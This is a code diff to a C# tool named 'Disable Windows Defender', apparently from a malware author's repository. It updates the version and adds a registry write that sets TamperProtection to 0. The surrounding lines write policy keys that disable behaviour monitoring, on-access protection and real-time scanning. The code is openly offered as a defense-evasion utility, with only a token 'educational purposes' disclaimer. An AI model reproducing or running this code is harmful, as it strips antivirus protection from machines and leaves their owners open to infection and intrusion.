@@ -1,10 +1,9 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
+using Microsoft.Win32;
 using System.Diagnostics;
 using System.Security.Principal;
-
 //       │ Author     : NYAN CAT
-//       │ Name       : Disable Windows Defender v0.5
+//       │ Name       : Disable Windows Defender v1.0
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only. 
@@ -21,6 +20,7 @@ namespace Disable_Windows_Defender
             RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
             RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
             RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
+            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
 
             CheckDefender();
         }
